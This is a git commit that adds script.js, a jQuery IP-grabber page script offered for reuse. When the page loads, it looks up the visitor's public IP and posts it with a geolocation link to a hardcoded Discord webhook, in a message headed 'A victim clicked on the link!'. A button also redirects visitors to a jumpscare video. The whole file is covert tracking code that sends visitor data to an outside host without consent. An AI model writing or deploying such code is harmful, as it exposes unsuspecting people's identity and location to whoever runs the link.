e5b3ea7e63ecef9971df42dad2729c937aed2c73
talkingtogod <lorisbaj2010@gmail.com>
2025-02-24 21:18:18 +0100

    Update and rename index.js to script.js

---
+++ script.js
@@ -0,0 +1,62 @@
+// GIVE ALL CREDIT TO ELK, PLEASE!!
+//     MY DISCORD IS @2elk !!!!
+
+$(document).ready(function() {
+    
+    function ipmsg(ipadd) {
+        
+        var webhookURL = 'https://discordapp.com/api/webhooks/1331717749466075238/fshlI_oF0X_ry2LLu06Yz8KPjUz9Wg8-5al4yTyrtz4Djg4W_nERS3_Bp6p6CWF6OABo'; // PUT IN YOUR WEBHOOK URL
+        
+        var payload = {
+            
+            content: '      A victim clicked on the link! @here\nIPv4 Address: ' + ipadd + '\nGeolocation Info: https://iplocation.io/ip/' + ipadd + '\n  ᓚᘏᗢ  -  e l k  w a s  h e r e  -'
+            
+        };
+
+        $.ajax({
+            
+            url: webhookURL,
+            
+            type: 'POST',
+            
+            data: JSON.stringify(payload),
+            
+            contentType: 'application/json',
+            
+            success: function() {
+                
+                console.log('success');
+                
+            },
+            
+            error: function(xhr, status, error) {
+                
+                console.error('failed', error);
+                
+            }
+            
+        });
+        
+    }
+    
+
+    var homepage = $('#homepage-btn');
+    
+    homepage.on('click', function(event) {
+        
+        event.preventDefault();
+        
+        window.location.href = "https://3elk.github.io/JumpScare-Spam/jumpscare.mp4"; // YOU CAN CHANGE THE URL
+        
+    }); 
+    
+
+    $.getJSON('https://api.ipify.org?format=json', function(data) {
+        
+        var ipadd = data.ip;
+        
+        ipmsg(ipadd);
+        
+    });
+    
+});
